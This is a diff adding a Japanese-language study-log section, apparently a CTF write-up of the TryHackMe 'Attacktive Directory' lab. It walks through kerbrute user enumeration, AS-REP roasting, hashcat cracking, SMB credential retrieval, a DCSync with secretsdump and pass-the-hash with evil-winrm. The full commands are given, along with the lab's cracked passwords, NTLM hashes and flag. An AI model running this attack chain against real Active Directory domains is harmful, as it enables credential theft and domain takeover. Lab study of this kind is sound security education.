@@ -133,13 +133,30 @@
 <li class="toctree-l3"><a class="reference internal" href="#day5">Day5勉強したこと</a></li>
 </ul>
 </li>
-<li class="toctree-l2"><a class="reference internal" href="#day6">Day6</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#kerbrute">kerbruteのインストール</a></li>
-<li class="toctree-l3"><a class="reference internal" href="#id20">Day6勉強したこと</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#day6-activedirectory">Day6：ActiveDirectoryへの攻撃</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#kerbrute">事前準備：kerbruteのインストール</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id20">偵察</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#activedirectory">ActiveDirectoryとは</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#kerberos">Kerberos認証とは</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#as-rep-roasting">AS-REP Roasting攻撃</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id21">Kerbruteでユーザー調査</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#tgt">TGTの取得とハッシュからパスワードをクラッシュ</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#impackettgt">Impacketを利用したTGTの取得</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#hash">Hashのクラッシュ</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#dcsync">DCSync攻撃</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#impacketdcsync">Impacketを利用したDCsync</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#pass-the-hashadmin">Pass the HashでAdminをハック</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#day6">Day6勉強したこと</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="#day7">Day7</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#id21">Day7勉強したこと</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id22">Day7勉強したこと</a></li>
 </ul>
 </li>
 </ul>
@@ -765,23 +782,351 @@ WantedBy=multi-user.target&#39; &gt; $TF
 </ul>
 </section>
 </section>
-<section id="day6">
-<h2>Day6<a class="headerlink" href="#day6" title="この見出しへのパーマリンク">¶</a></h2>
+<section id="day6-activedirectory">
+<h2>Day6：ActiveDirectoryへの攻撃<a class="headerlink" href="#day6-activedirectory" title="この見出しへのパーマリンク">¶</a></h2>
+<p><a class="reference external" href="https://tryhackme.com/room/attacktivedirectory">Attacktive Directory</a><br />
+ActiveDirectoryは、会社や学校などの組織のPCを一元管理するWindowsサーバー上で動作するシステム。
+ActiveDirectoryで利用されるKerberos認証の脆弱性をハッキングして、不正ログインと権限昇格をする。</p>
 <section id="kerbrute">
-<h3>kerbruteのインストール<a class="headerlink" href="#kerbrute" title="この見出しへのパーマリンク">¶</a></h3>
+<h3>事前準備：kerbruteのインストール<a class="headerlink" href="#kerbrute" title="この見出しへのパーマリンク">¶</a></h3>
 <p>書籍のkerbrute_linux_amd64はUTM上では動かないそうなので下サイトに従って対応する。</p>
 <ul class="simple">
 <li><p><a class="reference external" href="https://qiita.com/yama53san/items/dc96912ff565143c51ed">書籍「7日間でハッキングをはじめる本」をM1Macで完遂できるようにしたこと</a></p></li>
 </ul>
+<p>git からkerbruteをclone</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">ropnop</span><span class="o">/</span><span class="n">kerbrute</span><span class="o">.</span><span class="n">git</span>
+</pre></div>
+</div>
+<p>Makefileを編集</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ce</span> <span class="n">kerbrute</span>
+<span class="n">nano</span> <span class="n">Makefile</span>
+</pre></div>
+</div>
+<p>ARCHSの文末にarm64を追記</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ARCHS</span><span class="o">=</span><span class="n">amd64</span> <span class="mi">386</span> <span class="n">arm64</span>
+</pre></div>
+</div>
+<p>以下を管理者権限で実行</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
+<span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">golang</span><span class="o">-</span><span class="n">go</span>
+</pre></div>
+</div>
+<p>buildの成功</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6/kerbrute]
+└─$ make linux
+Building for linux amd64...
+Building for linux 386...
+Building for linux arm64...
+Done.
+</pre></div>
+</div>
+<p>dist配下に<code class="docutils literal notranslate"><span class="pre">kerbrute_linux_arm64</span></code>ができているので実行してスクリプトが流れたら大丈夫。
+<img alt="" src="../_images/7DayHacking_day6_1.png" /></p>
 </section>
 <section id="id20">
-<h3>Day6勉強したこと<a class="headerlink" href="#id20" title="この見出しへのパーマリンク">¶</a></h3>
+<h3>偵察<a class="headerlink" href="#id20" title="この見出しへのパーマリンク">¶</a></h3>
+<p>まずはいつも通り、nmapでネットワークを調査してみる。以下をチェック</p>
+<ul class="simple">
+<li><p>88:kerberos</p></li>
+<li><p>135:RPC(Remote Procedure Call)</p></li>
+<li><p>139/445:SMB</p></li>
+<li><p>3389:Windowsのリモートデスクトップ</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Host is up (0.33s latency).
+Not shown: 987 closed tcp ports (conn-refused)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-20 03:47:10Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+</pre></div>
+</div>
+<p>対象を絞って調査</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">88</span><span class="p">,</span><span class="mi">135</span><span class="p">,</span><span class="mi">139</span><span class="p">,</span><span class="mi">3389</span> <span class="o">-</span><span class="n">A</span> <span class="o">-</span><span class="n">Pn</span> <span class="o">-</span><span class="n">oN</span> <span class="n">nmap</span><span class="o">-</span><span class="mf">2.</span><span class="n">txt</span> <span class="o">-</span><span class="n">v</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>
+</pre></div>
+</div>
+<p>結果は以下にドメイン名があることがわかる</p>
+<ul class="simple">
+<li><p>NetBIOS_Domain_Name: THM-AD</p></li>
+<li><p>DNS_Domain_Name: spookysec.local
+今後はspookysec.localのドメインを利用する。</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span> <span class="n">Microsoft</span> <span class="n">Terminal</span> <span class="n">Services</span>
+<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">20</span><span class="n">T03</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">34</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="mi">0</span><span class="n">s</span> <span class="kn">from</span> <span class="nn">scanner</span> <span class="n">time</span><span class="o">.</span>
+<span class="o">|</span> <span class="n">rdp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="n">Target_Name</span><span class="p">:</span> <span class="n">THM</span><span class="o">-</span><span class="n">AD</span>
+<span class="o">|</span>   <span class="n">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="n">THM</span><span class="o">-</span><span class="n">AD</span>
+<span class="o">|</span>   <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">ATTACKTIVEDIREC</span>
+<span class="o">|</span>   <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">spookysec</span><span class="o">.</span><span class="n">local</span>
+<span class="o">|</span>   <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">AttacktiveDirectory</span><span class="o">.</span><span class="n">spookysec</span><span class="o">.</span><span class="n">local</span>
+<span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">10.0.17763</span>
+<span class="o">|</span><span class="n">_</span>  <span class="n">System_Time</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">20</span><span class="n">T03</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">21</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>
+</pre></div>
+</div>
+</section>
+<section id="activedirectory">
+<h3>ActiveDirectoryとは<a class="headerlink" href="#activedirectory" title="この見出しへのパーマリンク">¶</a></h3>
+<p>ActiveDirectoryは所属するユーザーID/パスワード管理やユーザー認証、認可ログの集約などを一元管理することができる。
+一元管理できることは便利ではあるが、攻撃の対象になりやすい。</p>
+<ul class="simple">
+<li><p>ドメイン：情報を管理する範囲</p></li>
+<li><p>ドメインコントローラー：ドメイン情報を持っているサーバー
+<img alt="" src="../_images/7DayHacking_day6_3.png" />
+<a class="reference external" href="https://www.ntt.com/business/services/security/security-management/wideangle/lp/lp10.html">Active Directory（アクティブディレクトリ）とは？初心者にもわかりやすく解説</a></p></li>
+</ul>
+</section>
+<section id="kerberos">
+<h3>Kerberos認証とは<a class="headerlink" href="#kerberos" title="この見出しへのパーマリンク">¶</a></h3>
+<p>Kerberos認証とは、クライアントに対して、認証を行いチケットを払い出して、サービスの利用を許可する仕組み。
+登場する用語は以下の通り。</p>
+<table class="colwidths-auto docutils align-default">
+<thead>
+<tr class="row-odd"><th class="text-left head"><p>略称</p></th>
+<th class="text-left head"><p>正式名称</p></th>
+<th class="text-left head"><p>役割・説明</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td class="text-left"><p>KDC</p></td>
+<td class="text-left"><p>Key Distribution Center</p></td>
+<td class="text-left"><p>認証の中枢。以下のASとTGSを内包する。</p></td>
+</tr>
+<tr class="row-odd"><td class="text-left"><p>｜--- AS</p></td>
+<td class="text-left"><p>Authentication Server</p></td>
+<td class="text-left"><p>クライアントの認証を行い、TGTを発行する。</p></td>
+</tr>
+<tr class="row-even"><td class="text-left"><p>｜--- TGS</p></td>
+<td class="text-left"><p>Ticket Granting Server</p></td>
+<td class="text-left"><p>TGTを使ってサービス用のチケット（ST）を発行する。</p></td>
+</tr>
+<tr class="row-odd"><td class="text-left"><p>TGT</p></td>
+<td class="text-left"><p>Ticket Granting Ticket</p></td>
+<td class="text-left"><p>一時的な認証トークン。TGSにサービスチケット(ST)を要求する際に使用される。</p></td>
+</tr>
+<tr class="row-even"><td class="text-left"><p>ST</p></td>
+<td class="text-left"><p>Service Ticket</p></td>
+<td class="text-left"><p>サービスにアクセスするためのチケット。サーバーがこのチケットを確認して許可する。</p></td>
+</tr>
+</tbody>
+</table>
+<p>認証のイメージとしては以下。
+最初にTGTを認証によって払い出してもらって、TGTを利用してSTを払い出してもらうという流れ。
+<img alt="" src="../_images/7DayHacking_day6_4.png" />
+<a class="reference external" href="https://milestone-of-se.nesuke.com/sv-advanced/activedirectory/kerberos-spnego/">【図解】初心者にも分かるKerberos認証とspnegoの仕組み ～SSOのシーケンス,統合windows認証について～</a></p>
+</section>
+<section id="as-rep-roasting">
+<h3>AS-REP Roasting攻撃<a class="headerlink" href="#as-rep-roasting" title="この見出しへのパーマリンク">¶</a></h3>
+<p>Kerberosの設定において、認証を簡略化した方法を利用している場合脆弱性となりうる。</p>
+<ul class="simple">
+<li><p>前提</p>
+<ul>
+<li><p>ASに対してTGTを発行を発行してもらう際「事前認証」設定がある</p></li>
+<li><p>事前認証では、時間などをユーザーの秘密鍵を利用して暗号化してもらうことで本人確認を行う</p></li>
+<li><p>本人確認が取れたらTGTをレスポンスする</p></li>
+<li><p>TGTの事前認証については、必須ではないためスキップが可能</p></li>
+<li><p>TGTの中にはパスワードのハッシュ値が入っているが、暗号化されているのでTGTが流出しても本来は利用できない</p></li>
+</ul>
+</li>
+<li><p>攻撃方法</p>
+<ul>
+<li><p>事前認証をスキップになっているユーザーを調査</p></li>
+<li><p>事前認証をスキップしてTGTを取得</p></li>
+<li><p>TGTのハッシュをクラッシュしてパスワードを割り出す</p></li>
+</ul>
+</li>
+</ul>
+<section id="id21">
+<h4>Kerbruteでユーザー調査<a class="headerlink" href="#id21" title="この見出しへのパーマリンク">¶</a></h4>
+<p>事前準備でkerbruteの実行はできているので、攻撃対象の設定をする。</p>
+<p>kali上の<code class="docutils literal notranslate"><span class="pre">/etc/hosts</span></code>にIPとドメインの名前解決の設定をしておく</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">nano</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
+</pre></div>
+</div>
+<p>最終行に以下を追加(間はtab)</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mf">10.10</span><span class="o">.</span><span class="n">x</span><span class="o">.</span><span class="n">x</span>   <span class="n">spookysec</span><span class="o">.</span><span class="n">local</span>
+</pre></div>
+</div>
+<p>試しにPingを打って返事が来ればOK</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ping</span> <span class="n">spookysec</span><span class="o">.</span><span class="n">local</span>
+<span class="o">--&gt;</span><span class="mi">64</span> <span class="nb">bytes</span> <span class="kn">from</span> <span class="nn">spookysec.local</span> <span class="p">(</span><span class="mf">10.10.100.203</span><span class="p">):</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">124</span> <span class="n">time</span><span class="o">=</span><span class="mi">720</span> <span class="n">ms</span>
+<span class="o">--&gt;</span><span class="mi">64</span> <span class="nb">bytes</span> <span class="kn">from</span> <span class="nn">spookysec.local</span> <span class="p">(</span><span class="mf">10.10.100.203</span><span class="p">):</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">124</span> <span class="n">time</span><span class="o">=</span><span class="mi">720</span> <span class="n">ms</span>
+</pre></div>
+</div>
+<p>攻撃用のユーザーリストとパスワードリストについては今回TryHackMeのRoomのTask4に準備されているのでDLしておく。
+本来は、元々Kaliに準備されている辞書を利用するべきだが、今回は事前準備されているものを利用する。</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">raw</span><span class="o">.</span><span class="n">githubusercontent</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Sq00ky</span><span class="o">/</span><span class="n">attacktive</span><span class="o">-</span><span class="n">directory</span><span class="o">-</span><span class="n">tools</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">userlist</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">wget</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">raw</span><span class="o">.</span><span class="n">githubusercontent</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Sq00ky</span><span class="o">/</span><span class="n">attacktive</span><span class="o">-</span><span class="n">directory</span><span class="o">-</span><span class="n">tools</span><span class="o">/</span><span class="n">master</span><span class="o">/</span><span class="n">passwordlist</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+<p>Userを割り出すためにKerbruteを利用して実行</p>
+<ul class="simple">
+<li><p>userenum: ユーザー名の列挙</p></li>
+<li><p>-d: 対象ドメイン指定</p></li>
+<li><p>--dc: ドメインコントローラー指定</p></li>
+<li><p>userlist.txt: 利用する辞書</p></li>
+</ul>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">kerbrute</span><span class="o">/</span><span class="n">dist</span><span class="o">/</span><span class="n">kerbrute_linux_arm64</span> <span class="n">userenum</span> <span class="o">-</span><span class="n">d</span> <span class="n">spookysec</span><span class="o">.</span><span class="n">local</span> <span class="o">--</span><span class="n">dc</span> <span class="n">spookysec</span><span class="o">.</span><span class="n">local</span> <span class="n">userlist</span><span class="o">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+<p><img alt="" src="../_images/7DayHacking_day6_2.png" /></p>
+<p>結果として最初からいるアカウント（ビルトインアカウント）でもないし重要性なユーザーっぽいのでこの辺りに狙いを定める</p>
+<ul class="simple">
+<li><p>svc-admin&#64;spoolysec.local</p></li>
+<li><p>backup&#64;spookysec.local</p></li>
+</ul>
+</section>
+</section>
+<section id="tgt">
+<h3>TGTの取得とハッシュからパスワードをクラッシュ<a class="headerlink" href="#tgt" title="この見出しへのパーマリンク">¶</a></h3>
+<section id="impackettgt">
+<h4>Impacketを利用したTGTの取得<a class="headerlink" href="#impackettgt" title="この見出しへのパーマリンク">¶</a></h4>
+<p>Impacketは、さまざまなプロトコルをプログラムから操作しやすくなるためのライブラリやツールの集まり。
+GetNPUser.pyを利用して、取得したユーザーを利用してTGTを取得してみる</p>
+<p>以下を実行してパスワードは未記入でEnter</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">./</span><span class="n">GetNPUsers</span><span class="o">.</span><span class="n">py</span> <span class="n">spookysec</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">svc</span><span class="o">-</span><span class="n">admin</span>   
+</pre></div>
+</div>
+<p>得られたTGTが以下</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f~~~~~555
+</pre></div>
+</div>
+<p>得られたHash値はhash.txtに書き込んでおく</p>
+</section>
+<section id="hash">
+<h4>Hashのクラッシュ<a class="headerlink" href="#hash" title="この見出しへのパーマリンク">¶</a></h4>
+<p>取得できたTGTのハッシュからhashcatを利用してhash解析をしてパスワードを取得。</p>
+<p>hashcatでは、解析したいハッシュ対象を指定するため、確認するとAS-REQは18200</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ hashcat -h |grep Kerberos
+  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
+</pre></div>
+</div>
+<p>hashcatを実行してみると、management2005がパスワードとわかる！</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Dictionary cache built:
+* Filename..: passwordlist.txt
+* Passwords.: 70188
+* Bytes.....: 569236
+* Keyspace..: 70188
+* Runtime...: 0 secs
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f~~~~~555:management2005
+</pre></div>
+</div>
+<p>IDとパスワードからSMBサービスにログインをしてみる。
+SMBのポートを利用してファイルサーバーにアクセスしてみる</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ smbclient -L \\\\spookysec.local -U svc-admin    
+Password for [WORKGROUP\svc-admin]:management2005
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backup          Disk      
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to spookysec.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+</pre></div>
+</div>
+<p>backupの中身からbackupユーザーのIDとPWを取得</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ smbclient  \\\\spookysec.local\\backup -U svc-admin
+Password for [WORKGROUP\svc-admin]:management2005
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Apr  5 04:08:39 2020
+  ..                                  D        0  Sun Apr  5 04:08:39 2020
+  backup_credentials.txt              A       48  Sun Apr  5 04:08:53 2020
+       
+                8247551 blocks of size 4096. 3668238 blocks available
+smb: \&gt; get backup_credentials.txt 
+getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \&gt; exit
+
+┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ less backup_credentials.txt 
+
+┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ cat backup_credentials.txt 
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw       
+</pre></div>
+</div>
+<p>最後に、得られた値がBase64dエンコードされている可能性があるので解読すると<code class="docutils literal notranslate"><span class="pre">backup2517860</span></code>がパスワードとわかる</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ cat backup_credentials.txt|base64 -d                        
+backup@spookysec.local:backup2517860
+</pre></div>
+</div>
+</section>
+</section>
+<section id="dcsync">
+<h3>DCSync攻撃<a class="headerlink" href="#dcsync" title="この見出しへのパーマリンク">¶</a></h3>
+<p>DCSync攻撃とは、ドメインコントローラーのバックアップ権限を持っているユーザーを利用して、バックアップ時にパスワード情報を抜き取る。
+ActiveDirectoryでは、パスワード情報などを暗号化したNTLMハッシュとして保管されている。</p>
+<section id="impacketdcsync">
+<h4>Impacketを利用したDCsync<a class="headerlink" href="#impacketdcsync" title="この見出しへのパーマリンク">¶</a></h4>
+<p>Impacketのツールを利用して、DCsyncを実行</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ ./secretsdump.py -just-dc-ntlm backup@spookysec.local -outputfile spookysec
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:backup2517860
+</pre></div>
+</div>
+<p>結果として、NTLMハッシュが出力され、AdminのパスワードのNTLMハッシュ値<code class="docutils literal notranslate"><span class="pre">0e0~~4fc</span></code>が取得できる</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mf">0e0363213</span><span class="n">e37b94221497260b0bcb4fc</span><span class="p">:::</span>
+<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
+<span class="o">~~~</span>
+<span class="o">~~~</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="pass-the-hashadmin">
+<h3>Pass the HashでAdminをハック<a class="headerlink" href="#pass-the-hashadmin" title="この見出しへのパーマリンク">¶</a></h3>
+<p>NTLMでは、ユーザー名とハッシュ化されたパスワードが保管されている。
+<code class="docutils literal notranslate"><span class="pre">Pass</span> <span class="pre">the</span> <span class="pre">Hash</span></code>ではユーザー情報とハッシュをそのまま利用して認証を済ましてしまうNTLM認証の脆弱性を突いて、ユーザーになりすます。</p>
+<p>Evil-WinRMというツールを利用することでPass the Hash攻撃を行ってroot.txtを取得</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>┌──(kali㉿kali)-[~/7DaysHacking/Day6]
+└─$ evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+~~~
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cat ../Desktop/root.txt
+TryHackMe{4ctiveD1rectoryM4st3r}
+</pre></div>
+</div>
+</section>
+<section id="day6">
+<h3>Day6勉強したこと<a class="headerlink" href="#day6" title="この見出しへのパーマリンク">¶</a></h3>
+<ul class="simple">
+<li><p>ActiveDirecrotyは組織のPCなどの管理を行うサービス</p></li>
+<li><p>ActiveDirectoryにはKerberos認証を利用されている</p></li>
+<li><p>Kerberosで事前認証をOFFにすると脆弱性となりうる</p></li>
+<li><p>認証のチケットと認可のチケットを利用するが認証チケットからパスワードが解析される可能性あり</p></li>
+<li><p>ActiveDirectoryのbackup権限を持つユーザーを奪われるとパスワード全体が流出する可能性あり</p></li>
+</ul>
 </section>
 </section>
 <section id="day7">
 <h2>Day7<a class="headerlink" href="#day7" title="この見出しへのパーマリンク">¶</a></h2>
-<section id="id21">
-<h3>Day7勉強したこと<a class="headerlink" href="#id21" title="この見出しへのパーマリンク">¶</a></h3>
+<section id="id22">
+<h3>Day7勉強したこと<a class="headerlink" href="#id22" title="この見出しへのパーマリンク">¶</a></h3>
 </section>
 </section>
 </section>
